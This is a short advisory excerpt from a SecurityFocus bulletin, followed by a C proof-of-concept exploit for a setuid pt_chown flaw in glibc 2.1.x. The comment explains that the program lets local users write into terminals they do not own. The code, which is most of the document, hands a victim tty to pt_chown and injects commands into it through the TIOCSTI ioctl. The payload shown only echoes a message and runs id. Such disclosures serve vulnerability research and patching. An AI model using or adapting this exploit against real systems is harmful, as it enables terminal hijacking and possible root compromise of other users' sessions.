// source: http://www.securityfocus.com/bid/597/info

// pt_chown is a program included with glibc 2.1.x that exists to aid the proper allocation of terminals for non-suid programs that don't have devpts support. It is installed setuid root, and is shipped with RedHat Linux 6.0. As it stands, pt_chown is vulnerable to an attack that allows malicious users to write aribtrary data to tty input/output streams (open file desciptors -> tty) that don't belong to them (you could theoretically get full control of the terminal). This is done by fooling the program into giving you access (it lacks security checks). Whether you can be compromised or not depends on the software you are using and whether it has support for devpts (screen, midnight commander, etc). The consequences are hijacking of terminals, possibly leading to a root compromise.

int main(int a,char* b[]) {

char* c="\nclear;echo huhuhu, it worked...;id;sleep 2\n";
int i=0,x=open(b[1],1); // Expect writable, allocated
// (eg. by screen) /dev/ttyXX as 1st arg

if (x<0) {
perror(b[1]);
exit(1);
}

if (!fork()) {
dup2(x,3);
execl("/usr/libexec/pt_chown","pt_chown",0);
perror("pt_chown");
exit(1);

}
sleep(1);
for (i;i<strlen(c);i++) ioctl(x,0x5412,&c[i]);

} 